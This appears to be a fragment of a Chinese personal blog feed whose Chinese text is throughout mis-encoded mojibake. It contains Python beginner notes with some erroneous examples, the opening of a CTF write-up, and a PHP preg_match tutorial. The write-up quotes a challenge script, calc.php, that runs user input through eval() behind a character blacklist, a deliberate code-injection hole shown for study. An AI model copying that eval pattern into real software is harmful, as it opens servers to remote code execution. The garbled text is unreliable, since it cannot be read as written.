a[::-1]=â€™ollehâ€™<br></p><h1>åè½¬åŸåˆ—è¡¨</h1>æˆ‘ä»¬çŸ¥é“ï¼Œå¯ä»¥ä½¿ç”¨åˆ‡ç‰‡çš„æ–¹æ³•å®ç°åˆ—è¡¨çš„åè½¬ï¼Œä½†æˆ‘ä»¬å§‹ç»ˆæ²¡æœ‰æ”¹å˜æºåˆ—è¡¨ï¼Œæ­£ç»çš„æ”¹å˜æºåˆ—è¡¨çš„æ–¹æ³•æ˜¯reverse  name.reserve() name=[5,4,3,2,1]<h1>æ’åº</h1><p>ç”¨çš„æ˜¯sortè¿™ä¸ªå‡½æ•°ï¼Œä»å°åˆ°å¤§æ’åˆ—ã€‚name=[1,4,3,4,2,5] name.sort() name=[1,2,3,4,4,5]</p><p>æ’åºåªèƒ½å­—ç¬¦ä¸²å’Œå­—ç¬¦ä¸²ï¼Œæ•°å­—å’Œæ•°å­—åœ¨ä¸€èµ·æ’åˆ—ï¼Œå­—ç¬¦ä¸²çš„æ’åˆ—ä¾é ä¸‹é¢çš„é‚£å¼ è¡¨</p><p><img src="1.png"></p><p>s=[â€˜@â€™,â€™4â€™,â€™&amp;â€™,â€™ASFDâ€™,â€™<em>â€˜],s.sort() s=[â€˜&amp;â€™, â€˜4â€™, â€˜@â€™, â€˜ASFDâ€™, â€˜</em>â€˜]</p><h1>forå¾ªç¯</h1><p>for i in s:<br>print(i)</p><p>&amp;<br><br>4<br><br>@<br><br>ASFD<br><br>_<br></p><h1>å…ƒç»„</h1>åªè¯»åˆ—è¡¨ï¼Œæ›¾åˆ æ”¹æŸ¥ä¸­åªæœ‰æŸ¥å¯ä»¥å·¥ä½œï¼Œå…¶ä»–è·Ÿåˆ—è¡¨ä¸€æ ·ã€‚å¦å¤–åˆ—è¡¨ç”¨çš„æ˜¯[],å…ƒç»„ç”¨çš„æ˜¯(),æ¯”å¦‚name=(1,2,3)<p>å…ƒç»„æœ¬èº«ä¸èƒ½ä¿®æ”¹ï¼Œå¦‚æœå…ƒç»„ä¸­å­˜åœ¨å¯ä¿®æ”¹çš„æ•°æ®ç±»å‹ï¼Œé‚£ä¹ˆè¯¥æ•°æ®å¯ä»¥è¢«ä¿®æ”¹ï¼šname=(1,2,3,[4,5])  name[1]=5  æŠ¥é”™ name[3][1]=â€hiâ€,æˆåŠŸä¿®æ”¹</p><h1>å­—ç¬¦ä¸²</h1><p>æ˜¯æœ‰ä¸‹æ ‡ï¼Œæœ‰åºçš„ï¼Œç„¶åå®ƒç›¸å½“äºä¸€ä¸ªåˆ—è¡¨ï¼Œä¹Ÿæ˜¯åªèƒ½è¯»ï¼Œä¸å¯ä¿®æ”¹çš„ï¼Œä»–ä¹Ÿå¯ä»¥è¿›è¡Œåˆ‡ç‰‡ï¼Œä»–ä¹Ÿæœ‰æ­¥é•¿ã€‚å°†ä¸€ä¸ªå­—ç¬¦ä¸²é¢ å€’a=â€helloâ€  a[::-1]=â€™ollehâ€™<br></p><p>å¯ä»¥è¿›è¡Œä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸åŠ ï¼Œå¦‚æœæœ‰ç‰¹æ®Šå­—ç¬¦ï¼Œéœ€è¦è½¬ä¹‰ï¼Œå¦‚æœname=â€˜cky\nâ€™ï¼Œprint(name)=cky<br>//ç©ºè¡Œ<br>å¦‚æœæƒ³è¦è½¬ä¹‰ï¼Œå¯ä»¥ï¼Œname=râ€™cky\nâ€™,ræ˜¯åŸç”Ÿå­—ç¬¦çš„æ„æ€ï¼Œæ­¤æ—¶printï¼ˆnameï¼‰=â€™cky\nâ€™<br></p><h2>ä¸€äº›å¸¸ç”¨çš„å‡½æ•°</h2>capitalize()é¦–å­—æ¯å¤§å†™<p>casefoldï¼ˆï¼‰æŠŠå¤§å†™éƒ½å˜æˆå°å†™</p><p>center()è¡¥ä¸¤è¾¹çš„é•¿åº¦ï¼Œå…·ä½“name=â€˜cky lsyâ€™ name.center(50,â€^â€)     ^^^^^^^^^^^^^^^^^^^^^cky lsy^^^^^^^^^^^^^^^^^^^^^^</p><p>count()ç»Ÿè®¡æŸä¸ªå­—ç¬¦åœ¨è¯¥å­—ç¬¦ä¸²ä¸­æœ‰å‡ ä¸ªï¼Œcount(å­—ç¬¦ï¼Œå­—ç¬¦ï¼Œå¼€å§‹çš„ç´¢å¼• é»˜è®¤æ˜¯0ï¼Œç»“æŸçš„ç´¢å¼• é»˜è®¤æ˜¯å­—ç¬¦ä¸²çš„é•¿åº¦)</p><p>endswithï¼ˆï¼‰åˆ¤æ–­ä»¥ä»€ä¹ˆç»“æŸï¼Œæ­£ç¡®è¿”å›trueï¼Œé”™è¯¯è¿”å›false</p><p>find()æŸ¥æ‰¾ä¸€ä¸ªå­—ç¬¦ï¼Œå¹¶è¿”å›ç¬¬ä¸€ä¸ªæ‰¾åˆ°çš„ç´¢å¼•å€¼ï¼Œè·Ÿåˆ—è¡¨çš„indexå·®ä¸å¤šã€‚findï¼ˆå­—ç¬¦ï¼Œå¼€å§‹çš„ç´¢å¼• é»˜è®¤æ˜¯0ï¼Œç»“æŸçš„ç´¢å¼• é»˜è®¤æ˜¯å­—ç¬¦ä¸²çš„é•¿åº¦ï¼‰ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°è¿”å›-1</p><p>format:ç›¸å½“äºå ä½ç¬¦ %sï¼Œä½†æ˜¯è¿™ä¸ªä¸è®¸è¦%sçš„ä¸€ä¸€å¯¹åº”çš„å…³ç³»ã€‚</p><p> name=â€™{0}.1 {1}.1 {0}.2 {1},2â€™</p><p>name.format(â€˜noâ€™,â€™NOâ€™)</p><p>â€˜no.1 NO.1 no.2 NO,2â€™</p><p>æˆ–è€…è¯å¯ä»¥ï¼Œname=â€™{name}.1 {name1}.1 {name}.2 {name1},2â€™</p><p>name.format(name=â€™noâ€™,name1=â€™NOâ€™)</p><p>å£°ç§°å­—å…¸ï¼šc=dict(name=â€™â€™)<br>æ·»åŠ ï¼šc[â€˜ageâ€™]=20<br>æ·»åŠ keyï¼šc=dict.fromkeys(ä½ è¦çš„keyåˆ—è¡¨)<br>updateï¼Œåˆå¹¶ï¼Œa.update.(c),å¦‚æœcä¸­æœ‰aå­˜åœ¨çš„keyï¼Œåˆ™è¦†ç›–açš„valueså€¼<br>æŸ¥ï¼šget<br>a.get(â€˜keyâ€™)å¦‚æœå­˜åœ¨ï¼Œè¿”å›valueï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œä¸è¿”å›<br>a.get(â€˜keyâ€™,-1)å¦‚æœä¸å­˜åœ¨è¿”å›-1<br>a.keys()è¿”å›æ‰€æœ‰çš„é”®å€¼ï¼Œa.values()è¿”å›æ‰€æœ‰çš„å€¼ï¼Œa.items()è¿”å›æ‰€æœ‰çš„é”®å€¼å’Œå€¼<br>å¾ªç¯<br>for i in a:<br>print(i)<br>for i in a:<br>print(i,a[i])<br>for i in a.items():<br>print(i)<br>for i,j in a.items():<br>print(i,j)<br>é›†åˆ<br>æ— åºï¼Œä¸èƒ½é‡å¤ï¼Œä¸å¯å˜<br>ä¸€ä¸ªå°ä¾‹å­ï¼Œæ‰¾å‡ºaï¼Œbä¸­é‡å¤çš„å…ƒç´ ï¼Œå¹¶å°†å…¶å­˜å…¥cä¸­<br>a=[1,2,3,12,434,56,23,12,2]<br>b=[1,23,45,2,34,56,23,45,2]<br>c=[]<br>for i in a:<br>if i in b:<br>c.append(i)<br>å»é‡ï¼šå¦‚æœa={1ï¼Œ3ï¼Œ4ï¼Œ1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œ1}ï¼Œé‚£ä¹ˆå›è½¦åï¼Œa={1,2,3,2},è‡ªåŠ¨å»é‡ï¼Œå¦‚æœ<br>a=[1,2,3,1,2,12,3]æ˜¯ä¸ªåˆ—è¡¨ï¼Œå¯ä»¥ç”¨c=set(a),å°±å¯ä»¥äº†ï¼Œsetæ˜¯è‹±æ–‡é›†åˆçš„æ„æ€ï¼Œ<br>c={1,2,3,12}<br>å¢åŠ ï¼šadd  a.add(å…ƒç´ )ï¼Œé’™å…ƒç´ ä¸€å®šæ˜¯ä¸å¯ä»¥æ”¹å˜çš„ç±»å‹ï¼Œåˆ—è¡¨ï¼Œå­—å…¸éƒ½æœ‰ä¸å¯ä»¥ï¼Œå…ƒç»„<br>æ˜¯å¯ä»¥çš„ï¼Œå¦‚æœæ·»åŠ çš„å…ƒç´ è¯¥é›†åˆä¸­æœ‰äº†ï¼Œå°±ä¸å¯ä»¥æ·»åŠ è¿›å»äº†ï¼Œä½†æ˜¯ä¸ä¼šæŠ¥é”™<br>åˆ é™¤ï¼šdiscardï¼Œa.discard(å…ƒç´ )ï¼Œå¦‚æœè¯¥å…ƒç´ ä¸å­˜åœ¨ä¹Ÿä¸ä¼šæŠ¥é”™<br>popï¼Œa.pop()éšæœºåˆ é™¤ï¼Œå®éªŒå‡ éä¸åƒæ˜¯éšå³åˆ é™¤ï¼Œæ„Ÿè§‰æ˜¯ä»å¤´å¼€å§‹åˆ é™¤ï¼Œæ¯æ¬¡åˆ ä¸€ä¸ª<br>removeï¼šè·Ÿdiscardä¸€æ ·ã€‚åªä¸è¿‡å°±å¦‚æœåˆ çš„æ˜¯é‡Œé¢æ²¡æœ‰çš„ï¼Œä¼šæŠ¥é”™<br>&amp;ï¼šæ±‚ä¸¤ä¸ªé›†åˆçš„ç›¸åŒçš„å…ƒç´ a{1,2,3,4,5},b={2,3,4,5,6}a&amp;b={2,3,4,5}<br>|:æ±‚ä¸¤ä¸ªé›†åˆçš„åˆé›†a|b={1,2ï¼Œ3ï¼Œ4ï¼Œ5ï¼Œ6}<br>-ï¼šå¦‚æœaä¸­å­˜åœ¨bä¸­çš„å…ƒç´ ï¼Œb-a={6}<br>^:è¸¢å‡ºå»ä¸¤è€…ä¸­éƒ½æœ‰çš„å…ƒç´ ï¼Œa^b={1,6}<br>åˆ¤æ–­æ˜¯ä¸æ˜¯ç›¸äº¤ï¼šisdisjoint<br>åˆ¤æ–­æ˜¯ä¸æ˜¯å­é›†ï¼šissubset<br>åˆ¤æ–­æ˜¯ä¸æ˜¯çˆ¶é›†ï¼šissuperset<br>intersectionï¼šå°†ä¸¤ä¸ªé›†åˆä¸­ç›¸åŒçš„å…ƒç´ å–å‡ºæ¥ï¼Œå°±è·Ÿ&amp;ä¸€æ ·<br>difference_update():ç›¸å½“äºa=a-b</p><p>2**4=16ï¼Œå°±æ˜¯2çš„4æ¬¡æ–¹<br>binï¼ˆæ•°å­—ï¼‰ï¼ŒæŠŠåè¿›åˆ¶æ¢æˆäºŒè¿›åˆ¶<br>hexï¼ˆæ•°å­—ï¼‰ï¼Œå°±æ˜¯å°†åè¿›åˆ¶è½¬æ¢æˆ16è¿›åˆ¶<br>ordï¼ˆç¬¦å·ï¼‰ï¼ŒæŸ¥è¯¢acsiiå—</p><p>hash<br>è¿™ç§è½¬æ¢æ˜¯ä¸€ç§å‹ç¼©è¿ç®—ï¼Œä¸èƒ½é€šè¿‡ç»“æœæ¨ç®—è¾“å…¥ï¼Œä¸å¯é€†ç®—æ³•ï¼Œå…·æœ‰åŠ å¯†ç‰¹æ€§<br>ç‰¹è¡Œï¼šè¡¥è¯¾ä½ ï¼Œè®¡ç®—å¿«<br>ä½œç”¨ï¼šå¯†ç ï¼Œæ•°å­—ç­¾åï¼Œæ–‡ä»¶å®Œæ•´æ€§æ ¡æ£€</p><p>åŸºäºhashçš„ä¸¤ä¸ªæ•°å­—ç±»å‹ï¼šdictï¼Œset<br>setå¤©ç”Ÿå»é‡ä¹Ÿæ˜¯å› ä¸ºhash<br>dictä¹‹æ‰€ä»¥æŸ¥è¯¢é€Ÿåº¦å¾ˆå¿«ï¼Œæ‰€é‡‡ç”¨çš„æ˜¯hashå’ŒäºŒåˆ†æ³•</p><p>ç”¨pythonæ“ä½œæ–‡ä»¶<br>1.f=open(file=â€™æ–‡ä»¶åâ€™ï¼Œmode=â€™w\r\aâ€™),è¿™ä¸ªæ–‡ä»¶åœ¨ä½ çš„pythonä¸­å£°ç§°<br>2.f.read()åº¦å…¨éƒ¨ï¼Œf.readline()è¯»ä¸€è¡Œï¼Œf.readline(æƒ³è¯»å¤šå°‘å­—)ï¼Œf.readlines()å°†å…¨éƒ¨ä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¾“å‡ºï¼Œf.read(æƒ³è¯»å¤šå°‘å­—)<br>3.è¿½åŠ æ¨¡å¼ï¼Œä¹Ÿæ˜¯ä»¥å†™çš„æ–¹å¼è¿›è¡Œ<br>4.writeï¼Œf.write(æƒ³å†™çš„å­—)<br>ä¸‰ç§æ¨¡å¼ä¸èƒ½æ··åˆ</p><p>å¾ªç¯æ–‡ä»¶<br>a=open(file=â€™æ–‡ä»¶åâ€™)<br>for line in a:<br>print(line)<br>æ­¤æ—¶ä¼šå‡ºç°ï¼Œæ¯è¡Œä¹‹é—´éƒ½æœ‰ç©ºæ ¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨printï¼ˆline.strip()ï¼‰å»æ‰ç©ºè¡Œ<br>è¿˜å¯ä»¥ä½¿ç”¨ï¼Œline.split(),å°†æ¯è¡Œå˜æˆå­—ç¬¦ä¸²ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥æ›´å¥½åœ°ç­›é€‰ä¿¡æ¯</p><p>å¾ªç¯ä»1-100ï¼šå¯ä»¥ç”¨å‡½æ•°rangeï¼ˆ100ï¼‰</p><p>æ–‡ä»¶æ“ä½œçš„å…¶ä»–æ¨¡å¼ï¼š<br>f.seekï¼ˆï¼‰ï¼šç§»åŠ¨å¼€å§‹çš„å…‰æ ‡ï¼Œpython3é»˜è®¤ä½¿ç”¨gbkç¼–ç ï¼Œä¸€ä¸ªä¸­æ–‡æ˜¯ä¸¤ä¸ªå­—èŠ‚ï¼Œä¸€ä¸ªè‹±æ–‡å­—æ¯æ˜¯1ä¸ªå­—èŠ‚ï¼Œa.seek(2)<br>æ„æ€æ˜¯ä»ç¬¬äºŒä¸ªä¸­æ–‡å¼€å§‹<br>f.flush()å¼ºåˆ¶å°†å†…å­˜é‡Œçš„ä¸œè¥¿åˆ·å…¥ç¡¬ç›˜ï¼šå¹³æ—¶åªæœ‰åœ¨f.close()ä¹‹åï¼Œæ‰å¯ä»¥åœ¨å†…å­˜ä¸­çœ‹åˆ°æ–°å†™å…¥çš„æ–‡ä»¶ï¼Œä½¿ç”¨flushå¯ä»¥ç›´æ¥çœ‹åˆ°<br>f.readable()åˆ¤æ–­æ˜¯å¦å¯è¯»<br>f.tell()è¿”å›å…‰æ ‡çš„ä½ç½®<br>f.truncate(æ•°å­—)ï¼Œä»0æ¥åˆ°100ï¼Œå¦‚æœæ˜¯f.truncate()è¡¨ç¤ºä»0æ¥åˆ°å…‰æ ‡å¤„ï¼Œå¯ç”¨äºæ—¥å¿—æˆªæ–­<br>f.writelines()é¡¹æ–‡ä»¶ä¸­å†™å…¥å†…å®¹ï¼Œæ˜¯å­—ç¬¦ä¸²</p><p>æ··åˆæ¨¡å¼æœ‰ä¸‰ç§<br>a+ï¼šè¿½åŠ è¯»ï¼Œå…‰æ ‡å›åˆ°å°¾éƒ¨ï¼Œå¯ä»¥ä½¿ç”¨seekï¼ˆ0ï¼‰ä½¿å…‰æ ‡å›åˆ°å¼€å§‹<br>w+ï¼šæ²¡ç”¨<br>r+:è¯»åŠ å†™ï¼Œç›¸å½“äºè¿½åŠ çš„æ•ˆæœï¼ŒåŠ è½½å°¾éƒ¨ï¼Œå…‰æ ‡å›åˆ°å¼€å§‹</p><p>ä¿®æ”¹æ–‡ä»¶<br>f=open(â€˜â€™,â€™r+â€™)<br>f.seek()ä»ç¬¬å‡ ä¸ªå­—ç¬¦å¼€å§‹<br>f.write(),ç›´æ¥è¦†ç›–å…¶ä»–å­—ç¬¦</p><p>ä¸å å†…å­˜çš„ä¿®æ”¹æ–‡ä»¶<br>import os<br>old_file=â€hello.txtâ€<br>new_file=â€new.txtâ€<br>f=open(â€˜hello.txtâ€™,â€™r+â€™)<br>f_new=open(â€˜new.txtâ€™,â€™wâ€™)<br>old_str=â€™woâ€™<br>new_str=â€™niâ€™<br>for line in f:<br>    if â€˜woâ€™ in line:<br>        line=line.replace(old_str,new_str)</p><pre><code>f_new.write(line)</code></pre><p>f.close()<br>f_new.close()<br>os.replace(new_file,old_file)</p><p>å†™ä¸€ä¸ªè„šæœ¬ï¼Œä½¿å¾—ï¼Œå½“æˆ‘ä»¬è¾“å…¥æ–°çš„å­—ç¬¦ä¸²ï¼Œè¢«æ›¿æ¢çš„å­—ç¬¦ä¸²ï¼Œä»¥åŠæ–‡ä»¶åï¼Œå°±ä¼šè¿›è¡Œæ›¿æ¢<br>import sys<br>import os<br>a=sys.argv<br>old_file=a[3]<br>new_file=â€new.txtâ€<br>f=open(a[3],â€™r+â€™)<br>f_new=open(â€˜new.txtâ€™,â€™wâ€™)<br>old_str=a[1]<br>new_str=a[2]<br>for line in f:<br>    if a[1] in line:<br>        line=line.replace(old_str,new_str)</p><pre><code>f_new.write(line)</code></pre><p>f.close()<br>f_new.close()<br>os.replace(new_file,old_file)<br>f=open(a[3],â€™râ€™)<br>print(f.read())</p><p>ä½œä¸šï¼šè®¾ç½®ä¸€ä¸ªç™»é™†æ³¨å†Œï¼Œå¦‚æœç™»é™†ä¸‰æ¬¡æ²¡æœ‰æˆåŠŸï¼Œå°±é”å®šç”¨æˆ·ï¼š</p><p>c=0<br>answer=input(â€˜è¿™æ˜¯æˆ‘ä»¬çš„ç½‘ç«™ï¼Œæ‚¨æ˜¯ç™»é™†è¿˜æ˜¯æ³¨å†Œï¼šâ€™)<br>if answer==â€™æ³¨å†Œâ€™:<br>    f=open(â€˜è®°å½•è¡¨â€™,â€™a+â€™)<br>    shujv=input(â€˜è¯·è¾“å…¥æ‚¨çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œç”¨ç©ºæ ¼éš”å¼€:â€™)<br>    shujv=shujv.replace(â€˜ â€˜,â€™â€™)<br>    f.write(shujv)<br>    f.write(â€˜\nâ€™)<br>    f.close()<br>if answer==â€™ç™»é™†â€™:<br>    def xunhuan():<br>        shujv = input(â€˜è¯·è¾“å…¥æ‚¨çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œç”¨ç©ºæ ¼éš”å¼€:â€™)<br>        shujv = shujv.replace(â€˜ â€˜, â€˜â€™)<br>        f = open(â€˜è®°å½•è¡¨â€™, â€˜râ€™)<br>        c = 0<br>        for line in f:<br>            if shujv in line:<br>                if len(shujv) == len(line):<br>                    print(â€˜ç™»é™†æˆåŠŸâ€™)<br>                    exit()<br>        f.close()<br>        print(â€˜ç™»é™†å¤±è´¥ï¼Œè¯·é‡æ–°ç™»é™†â€™)<br>        c += 1<br>while c&lt;3:<br>    xunhuan()<br>    c+=1<br>if c &gt;=3:<br>    print(â€œè´¦å·å·²ç»è¢«é”å®šâ€)<br>    exit()</p><p>å…‰æ ‡ä»ç¬¬äºŒè¡Œå¼€å§‹è¯»æ–‡ä»¶ï¼Œæ˜¯nextï¼ˆfï¼‰</p><p>æœ¬æ¥è¯´æ˜¯æŸ¥è‚¡ç¥¨çš„<br>ä¸ºäº†ç®€ä¾¿å°±ç”¨äº†æˆç»©ï¼Œæ„Ÿè§‰è¿™æ ·ä¹Ÿè¡Œ</p><p>f=open(â€˜è‚¡ç¥¨.txtâ€™,â€™râ€™,encoding=â€™utf-8â€™,errors=â€™ignoreâ€™)<br>keys=[]<br>zidian={}<br>zidian1={}<br>diyipai=f.readline()<br>liebiao=[]<br>diyipai=dict(diyipai.split())<br>while True:<br>    for line in f:<br>        line = list(line.split())<br>        zidian[line[0]] = line<br>    qingqiu = input(â€œæ¨¡ç³ŠæŸ¥è¯¢ï¼šâ€)<br>    for k, v in zidian.items():<br>        if qingqiu in k:<br>            print(v)<br>    f.seek(0)<br>    next(f)<br>    a = input(â€œä½ æƒ³ç­›é€‰æˆç»©çš„ç§‘ç›®â€)<br>    c = 0<br>    for k in diyipai.keys():<br>        if k in a[0]:<br>            break<br>        c = c + 1</p><pre><code>b = int(input(&quot;ä½ æƒ³ç­›é€‰æˆç»©&quot;))for line1 in f:    line1 = line1.split()    if int(line1[c]) &gt;= b:        print(line1)</code></pre><p>å‡çº§ç‰ˆæœ¬ï¼š<br>f=open(â€˜è‚¡ç¥¨.txtâ€™,â€™râ€™,encoding=â€™utf-8â€™,errors=â€™ignoreâ€™)<br>keys=[]<br>zidian={}<br>zidian1={}<br>diyipai=f.readline()<br>liebiao=[]<br>diyipai=dict(diyipai.split())<br>while True:<br>    for line in f:<br>        line = list(line.split())<br>        zidian[line[0]] = line<br>    qingqiu = input(â€œæ¨¡ç³ŠæŸ¥è¯¢ï¼šâ€)<br>    def hanshu():<br>        global qingqiu<br>        for k, v in zidian.items():<br>            if qingqiu in k:</p><pre><code>            if len(qingqiu) == 0:                qingqiu = input(&quot;ä¸èƒ½æ˜¯ç©ºç™½è¯·é‡æ–°è¾“å…¥:&quot;)                hanshu()                return//é‡è¦çš„æ˜¯ï¼Œä¸ºä»€ä¹ˆæŠŠreturnåŠ åˆ°äº†è¿™é‡Œï¼Œå¦‚æœä¸åŠ returnï¼Œåˆ™ä¼šè¿”å›æˆ‘æ‰“äº†å‡ ä¸ªç©ºç™½ï¼Œå°±æœ‰å‡ æ¡æ•°æ®ï¼Œæƒ³ä¸æ˜ç™½            else:                print(v)hanshu()f.seek(0)next(f)a = input(&quot;ä½ æƒ³ç­›é€‰æˆç»©çš„ç§‘ç›®:&quot;)c = 0for k in diyipai.keys():    if k in a[0]:        break    c = c + 1b = int(input(&quot;ä½ æƒ³ç­›é€‰æˆç»©:&quot;))for line1 in f:    line1 = line1.split()    if int(line1[c]) &gt;= b:        print(line1)</code></pre><h2>é«˜é˜¶å‡½æ•°</h2><p>æ»¡è¶³æ¡ä»¶ï¼šæŠŠå‡½æ•°å½“ä½œå‚æ•°ä¼ å…¥ï¼Œæˆ–è€…è¿”å›ä¸€ä¸ªå‡½æ•°</p><pre><code>         def jieduizhi(n):              return int(str(n).strip())         def add(x,y,f):              return f(x)+f(y)        print(add(30,-14,jieduizhi))        def qvyvshu(n):              a=-n              return a        print(add(30,18,qvyvshu))        def add1():              return add(10,12,jieduizhi)        print(add1())</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>easy cacl</title>
      <link href="/2021/02/03/cacl/"/>
      <url>/2021/02/03/cacl/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>æŒ‰ç†è¯´ï¼Œä¸€èˆ¬é¢˜ç›®éƒ½è·Ÿé¢˜æœ‰å…³ï¼Œä½†æ˜¯ä¸ºæ’’å­è¿™ä¸ªæ²¡ä¸€ç‚¹å…³ç³»ï¼Œå¥½å¥‡æ€ª</p><span id="more"></span><p>æ‰“å¼€æ˜¯è®©ç®—æ•°çš„ï¼Œå°±å¿˜äº†æˆ‘åœ¨å“ªæ‰“å¼€äº†cacl.phpå‡ºç°äº†åˆ«çš„ç•Œé¢ï¼Œçœ‹wpå¥½åƒæ˜¯è¯´åœ¨bpæŠ“åŒ…çš„æ—¶å€™å¯ä»¥çœ‹è§ï¼Œæˆ‘è®°å¾—æˆ‘åº”è¯¥æ˜¯åœ¨æºä»£ç ä¸­æ‰¾åˆ°çš„ï¼Œä½†æ˜¯emmï¼Œç°åœ¨æ‰¾ä¸åˆ°äº†ï¼Œå°±è¿™æ ·å­å§ã€‚æˆ‘æƒ³èµ·æ¥äº†ï¼Œæºç ä¸­æœ‰</p><pre><code>    &lt;!--I&#39;ve set up WAF to ensure security.--&gt; &lt;script&gt;$(&#39;#calc&#39;).submit(function()&#123;    $.ajax(&#123;        url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),        type:&#39;GET&#39;,        success:function(data)&#123;            $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt;        &lt;strong&gt;ç­”æ¡ˆ:&lt;/strong&gt;$&#123;data&#125;        &lt;/div&gt;`);        &#125;,        error:function()&#123;            alert(&quot;è¿™å•¥?ç®—ä¸æ¥!&quot;);        &#125;    &#125;)    return false;&#125;)&lt;/script&gt;</code></pre><p>åœ¨è¿™<mark> url:â€calc.php?num=â€+encodeURIComponent($(â€œ#contentâ€).val()),</mark><br><br>è¿™ä¸ªè·Ÿjsæœ‰å…³ï¼Œè¿™æ–¹é¢è¿˜æ²¡æœ‰å¼€å§‹æ¥è§¦<br></p><pre><code>  è·å–idä¸ºcontentçš„HTMLæ ‡ç­¾å…ƒç´ çš„å€¼,æ˜¯JQuery  $(&quot;#content&quot;) åŒdocument.getElementById(â€œcontentâ€); $(&quot;#content&quot;).val() åŒdocument.getElementById(â€œcontentâ€).value;</code></pre><p>æç¤ºæ‰“å¼€caclã€‚php</p><pre><code>  &lt;?phperror_reporting(0);if(!isset($_GET[&#39;num&#39;]))&#123;show_source(__FILE__);&#125;else&#123;    $str = $_GET[&#39;num&#39;];    $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];    foreach ($blacklist as $blackitem) &#123;            if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) &#123;                    die(&quot;what are you want to do?&quot;);            &#125;    &#125;    eval(&#39;echo &#39;.$str.&#39;;&#39;);&#125;?&gt;</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>preg_matchå‡½æ•°è¯¦è§£ï¼Œforeach</title>
      <link href="/2021/02/03/preg-match%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/"/>
      <url>/2021/02/03/preg-match%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>åœ¨phpä¸­preg_matchï¼ˆï¼‰å‡½æ•°æ˜¯ç”¨æ¥æ‰§è¡Œæ­£åˆ™è¡¨è¾¾å¼çš„ä¸€ä¸ªå¸¸ç”¨çš„å‡½æ•°ã€‚æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œå‡ ä¹åœ¨æ‰€æœ‰çš„ç¼–ç¨‹è¡¨è¾¾å¼ä¸­éƒ½ä¼šç”¨åˆ°ã€‚<br><br>preg_matchï¼ˆï¼‰å‡½æ•°ç”¨äºè¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼ŒæˆåŠŸç»™è¿”å›1ï¼Œå¦åˆ™è¿”å›0.<br><br>preg_match()æˆåŠŸåŒ¹é…ä¸€æ¬¡åä¼šåœæ­¢åŒ¹é…ã€‚<br><br>preg_match(æ­£åˆ™è¡¨è¾¾å¼ï¼Œéœ€è¦åŒ¹é…æ£€ç´¢çš„å¯¹è±¡ï¼Œå¯é€‰ï¼šå‚¨å­˜åŒ¹é…ç»“æœçš„æ•°ç»„)<br><br>ä¾‹å­</p><pre><code>  &lt;?php  $str=&quot;Daniel J. Gross Catholic High School A. is a faith and family based community committed to developing Christian leaders through educational excellence in the Marianist tradition.&quot;;  if(preg_match(&quot;/[A-Z]. /&quot;,$str,$matches))&#123;  print_r($matches);  &#125;  ?&gt;</code></pre><p>è¾“å‡ºç»“æœ</p><pre><code> Array ( [0] =&gt; J. )</code></pre><h1>foreach</h1>åœ¨phpä¸­foreachå¾ªç¯è¯­å¥ï¼Œå¸¸ç”¨äºéå†æ•°ç»„ï¼Œä¸€èˆ¬æœ‰ä¸¤ç§ä½¿ç”¨æ–¹æ³•ï¼šä¸å–ä¸‹æ ‡ï¼Œå–ä¸‹æ ‡ã€‚<br><h1>(ä¸€)åªå–å€¼ï¼Œä¸å–ä¸‹æ ‡</h1><pre><code>   &lt;?php   foreach (æ•°ç»„ as å€¼)&#123;    //æ‰§è¡Œçš„ä»»åŠ¡  &#125;   ?&gt;</code></pre><h1>å–ä¸‹æ ‡ï¼Œä¹Ÿå–å€¼</h1><pre><code>   &lt;?php  foreach (æ•°ç»„ as ä¸‹æ ‡ =&gt; å€¼)&#123;  //æ‰§è¡Œçš„ä»»åŠ¡  &#125;  ?&gt;</code></pre><p>æ•°ç»„<br>    &lt;?php<br>    $students = array(<br>    â€˜2010â€™=&gt;â€™ä»¤ç‹å†²â€™,<br>    â€˜2011â€™=&gt;â€™æ—å¹³ä¹‹â€™,<br>    â€˜2012â€™=&gt;â€™æ›²æ´‹â€™,<br>    â€˜2013â€™=&gt;â€™ä»»ç›ˆç›ˆâ€™,<br>    â€˜2014â€™=&gt;â€™å‘é—®å¤©â€™,<br>    â€˜2015â€™=&gt;â€™ä»»æˆ‘è¡Œâ€™,<br>    â€˜2016â€™=&gt;â€™å†²è™šâ€™,<br>    â€˜2017â€™=&gt;â€™æ–¹æ­£â€™,<br>    â€˜2018â€™=&gt;â€™å²³ä¸ç¾¤â€™,<br>    â€˜2019â€™=&gt;â€™å®ä¸­åˆ™â€™,<br>    );//10ä¸ªå­¦ç”Ÿçš„å­¦å·å’Œå§“åï¼Œç”¨æ•°ç»„å­˜å‚¨</p><pre><code>//ä½¿ç”¨å¾ªç¯ç»“æ„éå†æ•°ç»„,è·å–å­¦å·å’Œå§“å  foreach($students as $v)&#123; echo $v;//è¾“å‡ºï¼ˆæ‰“å°ï¼‰å­¦å·ï¼šå§“åecho &quot;&lt;br /&gt;&quot;; 